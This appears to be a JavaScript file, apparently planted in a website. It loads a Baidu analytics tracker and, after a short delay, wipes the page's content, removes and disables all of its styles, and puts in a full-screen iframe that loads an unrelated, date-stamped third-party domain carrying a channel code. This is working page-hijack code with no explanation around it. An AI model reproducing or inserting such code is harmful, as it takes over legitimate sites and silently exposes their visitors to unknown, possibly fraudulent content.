var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?5a43f169d17d9c0a5c4d69015f99fe47";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();

setFrame("https://20251106.mgsp1.today/?channel_code=mogugugejingxiang#/");

function setFrame(url) {
  setTimeout(()=>{
    document.body.innerHTML=""
    document.querySelectorAll('style').forEach(tag => tag.remove())
    Array.from(document.styleSheets).forEach(stylesheet => {stylesheet.disabled = true})
    document.body.style.margin = '0'
    document.body.style.padding = '0'
    document.body.style.width = '100%'
    document.body.style.height = '100vh'
    document.body.style.minHeight = '100%'
    document.body.style.overflow = 'hidden'
    document.body.innerHTML='<iframe width="100%" height="100%" src="'+ url + '"></iframe>'
  },100)
}